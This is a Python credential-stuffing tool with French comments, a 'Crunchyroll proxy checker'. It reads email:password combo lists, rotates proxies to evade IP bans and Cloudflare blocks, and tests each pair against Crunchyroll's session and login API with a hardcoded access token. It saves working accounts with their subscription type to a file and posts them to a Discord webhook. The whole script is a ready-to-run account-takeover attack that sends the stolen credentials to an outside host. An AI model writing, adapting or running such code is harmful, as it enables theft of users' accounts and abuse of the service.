import requests
import json
import sys
import os
import random
from discord_webhook import DiscordWebhook, DiscordEmbed
from colorama import init, Fore
from bs4 import BeautifulSoup

init(autoreset=True)
red, blue, green, white = Fore.RED, Fore.BLUE, Fore.GREEN, Fore.WHITE

# --- CONFIGURATION ---
webhookurl = "" 
debug = False

# --- CHARGEMENT DES FICHIERS ---
def load_file(name):
    if os.path.exists(name):
        with open(name, 'r') as f:
            return f.read().splitlines()
    return []

combos = load_file("combos.txt")
proxies_list = load_file("proxy.txt")

if not combos:
    print(f"{red}[!] combos.txt est vide ou manquant.")
    sys.exit()

def get_random_proxy():
    if not proxies_list:
        return None
    proxy = random.choice(proxies_list)
    return {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }

def logo():
    print(f"{blue}=== CRUNCHYROLL PROXY CHECKER ===")
    print(f"{white}Combos: {len(combos)} | Proxies: {len(proxies_list)}")
    print("="*35)

def crunchycheck():
    logo()
    for i, line_raw in enumerate(combos):
        try:
            # Parsing combo
            line = line_raw.split(":")
            if len(line) < 2: continue
            email, password = line[0], line[1]

            # Sélection d'un proxy pour cette tentative
            current_proxy = get_random_proxy()
            
            # Etape 1 : Start Session
            r = requests.post('https://api.crunchyroll.com/start_session.0.json', 
                data={
                    'version': '1.0', 
                    'access_token': 'LNDJgOit5yaRIWN',
                    'device_type': 'com.crunchyroll.windows.desktop', 
                    'device_id': 'AYS0igYFpmtb0h2RuJwvHPAhKK6RCYId', 
                    'account': email, 'password': password
                }, 
                proxies=current_proxy, 
                timeout=7
            )

            if "session_id" in r.text:
                session_id = r.json()["data"]["session_id"]
                
                # Etape 2 : Login
                rl = requests.post('https://api.crunchyroll.com/login.0.json', 
                    data={'account': email, 'password': password, 'session_id': session_id},
                    proxies=current_proxy,
                    timeout=7
                )

                info = rl.json()
                if info.get("code") == "ok":
                    res = f"[VALID] {email}:{password} | Sub: {info['data']['user']['access_type']}"
                    print(f"{green}{res}")
                    with open("valid.txt", "a") as f: f.write(res + "\n")
                    if webhookurl: DiscordWebhook(url=webhookurl, content=res).execute()
                else:
                    print(f"[{i}] {red}Invalide: {email}")
            
            elif "cloudflare" in r.text.lower() or "banned" in r.text.lower():
                print(f"[{i}] {red}Proxy bloqué ou IP bannie. Changement de proxy...")
                continue # Le script passera au combo suivant avec un autre proxy

        except Exception as e:
            if debug: print(f"Erreur: {e}")
            continue

if __name__ == "__main__":
    crunchycheck()
